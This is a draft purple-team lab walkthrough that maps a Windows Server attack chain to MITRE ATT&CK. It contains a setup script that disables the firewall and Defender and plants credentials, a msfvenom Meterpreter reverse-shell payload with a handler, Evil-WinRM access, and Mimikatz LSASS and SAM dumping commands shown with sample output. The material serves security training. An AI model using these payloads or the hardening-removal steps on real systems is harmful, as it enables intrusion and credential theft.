# Purple Team Exercise - MITRE ATT&CK

## Background Scenario 

<TBD>

## Lab Network Diagram

![Netdiagram.drawio-460098550.png](docs/4760d0e62e8f4d919d612ce8dd16a705/Netdiagram.drawio-460098550.png)


## Learning Objectives
    1. Understand the cyber kill chain from reconnaissance through credential access
    2. Map real-world attack techniques to MITRE ATT&CK framework tactics and techniques
    3. Practice offensive security techniques using industry-standard tools (nmap, Nikto, Metasploit, Mimikatz)
    4. Identify detection opportunities at each stage of the attack lifecycle
    5. Evaluate detection mechanisms including network monitoring, log analysis, and EDR capabilities
    6. Develop purple team mindset by understanding both attacker tradecraft and defensive detection strategies

## Lab Summary
- **Pre-Requisite:** create the following script with notepad in `C:\`, name it `setup.ps1`, and run it with the command `C:\setup.ps1` (type `y` when prompted):

<details>
    <summary>setup.ps1</summary>

```
## Location must be in C:\

$ftpRoot = "C:\Users\spock\Desktop\Secret"
$ftpSite = "SecretFTP"
$ftpPort = 21
$userName = "spock"
$userPass = "Ihaveemotions123!"


# Install FTP and IIS
Install-WindowsFeature Web-Server,Web-Ftp-Server -IncludeManagementTools

# Create FTP site
Import-Module WebAdministration
New-WebFtpSite -Name $ftpSite -Port $ftpPort -PhysicalPath $ftpRoot -Force
Set-ItemProperty "IIS:\Sites\$ftpSite" -Name ftpServer.security.ssl.controlChannelPolicy -Value 0
Set-ItemProperty "IIS:\Sites\$ftpSite" -Name ftpServer.security.ssl.dataChannelPolicy -Value 0

# FTP auth with appcmd
$appcmd = "$env:SystemRoot\System32\inetsrv\appcmd.exe"

# Enable anon. auth for FTP site
& $appcmd set config -section:system.applicationHost/sites "/[name='$ftpSite'].ftpServer.security.authentication.anonymousAuthentication.enabled:true" /commit:apphost

# Enable read access for everyone
& $appcmd set config "$ftpSite" -section:system.ftpServer/security/authorization "/+[accessType='Allow',users='*',permissions='Read']" /commit:apphost

# Disable Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled false

# Create new spock user
New-LocalUser -Name "spock" -Password (ConvertTo-SecureString "Ihaveemotions123!" -AsPlainText -Force) -FullName "Spock" -Description "Vulcan without emotions"

# Make Spock’s Desktop writable for uploads
$spockDesktop = "C:\Users\spock\Desktop"
New-Item -ItemType Directory -Force -Path $spockDesktop | Out-Null
icacls $spockDesktop /grant "spock:(OI)(CI)(F)" /T

# Create FTP root directory on admin desktop
New-Item -ItemType Directory -Path $ftpRoot -Force 

# Make FTP dir accessible for the anonymous login user (IUSR)
icacls $ftpRoot /grant "IUSR:(OI)(CI)(RX)" /T

# Add to remote group
net localgroup "Remote Management Users" spock /add

# Create credentials file for exercise
echo username: $userName >  "$ftpRoot\creds.txt"
echo password: $userPass >> "$ftpRoot\creds.txt"

# Create flag on admin desktop
$adminDesktop = "C:\Users\Administrator\Desktop"
New-Item -ItemType Directory -Force -Path $adminDesktop | Out-Null
Set-Content -Path (Join-Path $adminDesktop "flag.txt") -Value "Th1s Fl4g 1s S3cr3t"

# Enable WinRM service and listener
winrm quickconfig -quiet

# Allow basic & unencrypted auth
Set-Item -Path WSMan:\localhost\Service\Auth\Basic -Value $true
Set-Item -Path WSMan:\localhost\Service\AllowUnencrypted -Value $true

# Disable WIn Defender
Add-MpPreference -ExclusionPath "C:\Users\spock\Desktop"
Set-MpPreference -DisableRealtimeMonitoring $true

## SeDebugPrivilege
# Export existing policy
secedit /export /cfg C:\privs.inf

# Read file
$content = Get-Content C:\privs.inf

# Modify or append SeDebugPrivilege
if ($content -match '^SeDebugPrivilege') {
    $content = $content -replace '^SeDebugPrivilege.*', 'SeDebugPrivilege = *S-1-5-32-544,spock'
} else {
    Add-Content C:\privs.inf "SeDebugPrivilege = *S-1-5-32-544,spock"
}

# Write file back
$content | Set-Content C:\privs.inf

# Apply newly created db
secedit /configure /db C:\Windows\Temp\secd_temp.sdb /cfg C:\privs.inf /overwrite /areas USER_RIGHTS /log C:\Windows\Temp\secd_apply.log
```

</details>

### Grading Scripts
<details>
    <summary>grading_script_1.py</summary>


```
#!/usr/bin/env python3

import subprocess
import re

#grading script 1
def check_eth0_ipv4():
    try:
        # Run ip command to get eth0 information
        result = subprocess.run(['ip', 'addr', 'show', 'eth0'], 
                              capture_output=True, 
                              text=True, 
                              check=True)
        
        # Look for inet (IPv4) address pattern
        ipv4_pattern = r'inet\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        
        if re.search(ipv4_pattern, result.stdout):
            print("grading script 1 pass!")
            return True
        else:
            return False
            
    except subprocess.CalledProcessError:
        # eth0 doesn't exist or other error
        return False
    except Exception:
        return False

if __name__ == "__main__":
    check_eth0_ipv4()
```

</details>

<details>
    <summary>grading_script_2.py</summary>


```
#!/usr/bin/env python3

import subprocess

try:
    result = subprocess.run(['ss', '-tn', 'sport', '=', ':4444'], 
                          capture_output=True, 
                          text=True)
    
    if 'ESTAB' in result.stdout:
        print("Grading Script 2 Pass!")
        
except:
    pass
```

</details>


- **Credentials**
    - kali-sep2024-364 - student:tartans
    - securityonion-aug2024-404 - student:tartans
    - testvictim-win2019-491 - Administrator:tartans@1

TechCorp engages a one-week purple team assessment to collaboratively probe and defend a Windows Server while mapping all actions to MITRE ATT&CK. The red team executes a full kill chain—from recon and initial access (e.g., FTP creds + WinRM) through privilege escalation, credential dumping (Mimikatz/Kiwi), and simulated exfiltration—while the blue team monitors SIEM/IDS, logs, and EDR in real time. Each technique is paired with concrete detection opportunities (Zeek/Suricata, Windows/Sysmon IDs, PowerShell logging) to reveal gaps and validate new rules. The engagement ends with ATT&CK mappings, improved detections, IR playbooks, and actionable hardening guidance.

**IMPORTANT**

Begin by checking your IP

    - `ip a`

If no IPv4 address is assigned, request one from the DHCP server on eth0

    - `sudo dhclient -v eth0`

Check again and take note of your IP address

    - `ip a`

At this time, run the **grading_script_1.py** make sure it passes before you move on

## Attack Simulation 

### 1) Recon / Network Scanning - T1595 / T1046
**Objective**
Discover live hosts on the local subnet and accurately enumerate open services and versions on identified targets using arp-scan followed by targeted nmap scans to discover and enumerate hosts and services.
#### Tool / Attack Steps
##### arp-scan
On the Kali machine

**Step 1:**: Scan local subnet and to find IP addresses to scan for nmap

    - sudo arp-scan --localnet

##### NMAP
**Step 2 - Host discovery:** Find hosts...... 
    **TODO**
    - sudo nmap .........

**Step 3 - Host service enumeration:** Scan the most common windows ports with Nmap, focussing on file-sharing and remote access protocols. 
- We use nmap from the Kali Machine (IP: `10.5.5.X`), to scan the victim Windows Server Machine (IP: `10.5.5.X`)
- The command we use in nmap is `sudo nmap -sC -sV -p 21,22,25,80,443,3389,5985,5986 10.5.5.X`
    - `-sC`  makes use of nmap's default scripts of the NSE
    - `-sV` enables service detection for each port
- Find an FTP server on port 21 which gives access to a folder that may contain some interesting information.



#### Detection: Maybe SO - Zeek /Suricata?

### 2) Initial Access  T1566
**MITRE ATT&CK Mapping:**
T1078: Valid Accounts
T1133: External Remote Services
#### Tool / Attack Steps
**Objective:** Gain initial authenticated access to the Windows Server using discovered credentials
- Use the FTP credentials to login to Windows victim using using Evil WinRM and verifying with crackmapexec

- After credentials Received, use Evil-WinRM to login to the windows host

- **Note:** Replace `$IP` with the Windows machine's IP address

**Step 1: Credential Discovery via Vulnerable Service**
```bash
# Connect to FTP server
ftp $IP
# Login as anonymous
Username: anonymous
Password: 
# Find the directory with the passwords file in the ftp server
# Download credential file
get passwords.txt
```

**Step 2: Validate Credentials with CrackMapExec**
Hint: you might need to escape a character
    
    - crackmapexec winrm $IP -u spock -p "discovered_password"
        
**Step 3: Establish Initial Access via Evil-WinRM**
    
    - evil-winrm -i $IP -u username -p "discovered_password"


#### Detection:
### 3) Execution T1059
**MITRE ATT&CK Mapping:**
T1059.001: Command and Scripting Interpreter: PowerShell
T1105: Ingress Tool Transfer

### Tool / Attack Steps
**Objective:** Upload malicious payloads and establish a more covert command and control channel
**Prep**
1. `mkdir ~/Desktop/payload`
2. `mkdir ~/Desktop/upload`
3. `cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ~/Desktop/upload`

**Step 1: Generate Meterpreter Payload**
On Kali Linux:
- `cd ~/Desktop/payload`
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=4444 -f exe -o shell.exe`
- **Note:** Replace `$IP` with your Kali machine's IP address

**Step 2: Start Meterpreter Handler**
This starts a listener waiting for the reverse connection from the target.
- `msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $IP; set LPORT 4444; exploit"`
- **Note:** Replace `$IP` with your Kali machine's IP address


**Step 3: Upload Payloads via Evil-WinRM**
From the Evil-WinRM session:
First, take note of the directory path you are working on, it could look like this `C:\Users\USER.COMP-NAME\Desktop`

Now we will upload meterpreter payload to temp directory (less monitored)
- `upload /home/student/Desktop/payload/shell.exe C:\Users\$USER.COMP-NAME\AppData\Local\Temp\shell.exe`
    - Make sure to replace $USER.COMP-NAME with the information you found

Upload Mimikatz for credential dumping
- `upload /home/student/Desktop/upload/mimikatz.exe C:\Users\$USER.COMP-NAME\Desktop\mimikatz.exe`
    - Make sure to replace $USER.COMP-NAME with the information you found

**Step 4: Execute Meterpreter Payload via Evil-WinRM**
- `C:\Users\$USER.COMP-NAME\AppData\Local\Temp\shell.exe`
    - Make sure to replace $USER.COMP-NAME with the information you found

**Step 5: Verify Meterpreter Session**
On Kali, in msfconsole:
- `meterpreter > getuid`

**What Happens:**
1. shell.exe executes on Windows Server (RHOST)
2. Initiates reverse TCP connection to Kali (LHOST:4444)
3. Meterpreter session established in Metasploit handler
4. Attacker now has interactive C2 channel with additional capabilities

At this time, run the **grading_script_2.py** make sure it passes before you move on

### 4) Persistence & Privilege Escalation - T1548 / T1134
**MITRE ATT&CK Mapping:**
- **T1548**: Abuse Elevation Control Mechanism
- **T1134**: Access Token Manipulation
- **T1055**: Process Injection
#### Tool / Attack Steps

**Objective**: Escalate privileges from a low-level user to NT AUTHORITY\SYSTEM by abusing elevation control mechanisms and token manipulation (T1548, T1134).
Verify successful escalation by migrating to a privileged process and confirming full administrative privileges for system-level control.

**Step 1: Check Current Privileges**
```
meterpreter > getuid
Server username: WIN-L8NB2IFND32\spock

meterpreter > getprivs
Enabled Process Privileges:
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
```
Running as domain/local user "spock" with limited privileges

**Step 2:** Check for all processes running and migrate to shell.exe then a Windows system32 process (HINT: Can you recall a windows application you previously used at the beginning of this lab?)
```
meterpreter > ps #look for a process you can migrate to
meterpreter > migrate PID #this is the reverse shell process shell.exe
meterpreter > migrate PID #this is a windows sys32 process
```

**Step 3: Verify Elevated Privileges**
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > getprivs
Enabled Process Privileges:
SeDebugPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeSystemEnvironmentPrivilege
SeTakeOwnershipPrivilege
SeLoadDriverPrivilege
... (many more)
```

**SYSTEM privileges allow:**
- Full access to all files and registry keys
- Ability to load kernel drivers
- Debug and inject into any process
- Dump credentials from LSASS memory
- Disable security controls

### 5) Credential Access - T1003
**MITRE ATT&CK Mapping:**
- **T1003.001**: OS Credential Dumping: LSASS Memory
- **T1003.002**: OS Credential Dumping: Security Account Manager
- **T1558**: Steal or Forge Kerberos Tickets

#### Tool / Attack Steps

**Objective**: Extract credentials from memory and local databases for lateral movement and persistence

##### Method 1: Using Mimikatz (Manual)

**Step 1: Execute Mimikatz from Meterpreter**
```
meterpreter > dir /Users/spock/Desktop
meterpreter > execute -f mimikatz.exe -i -H
Process 3956 created.
Channel 1 created.
```

**Step 2: Enable Debug Privilege**
```
mimikatz # privilege::debug
Privilege '20' OK
```
This enables SeDebugPrivilege required to access LSASS memory.

**Step 3: Dump Credentials from LSASS Memory**
```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : NETWORK SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/10/2025 9:30:15 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WIN-L8NB2IFND32$
         * Domain   : WORKGROUP
         * NTLM     : a1b2c3d4e5f6...
        tspkg :
        wdigest :
         * Username : spock
         * Domain   : WIN-L8NB2IFND32
         * Password : StarTrek123!
        kerberos :
        ...
```

**Step 4: Execute any post exploit mimikatz cmds on shell**


    - `sekurlsa::logonpasswords`
    - `lsadump::sam`
    - `sekurlsa::msv`
    - `sekurlsa::wdigest`


## Detection Mechanisms 
- Detection Difficulty Ranking (Hardest to Easiest to Detect):
    - Meterpreter with process migration + HTTPS (port 443) - Hardest
    - Meterpreter reverse TCP (random port) - Hard
    - Evil-WinRM over HTTPS (5986) - Medium
    - Evil-WinRM over HTTP (5985) - Easy




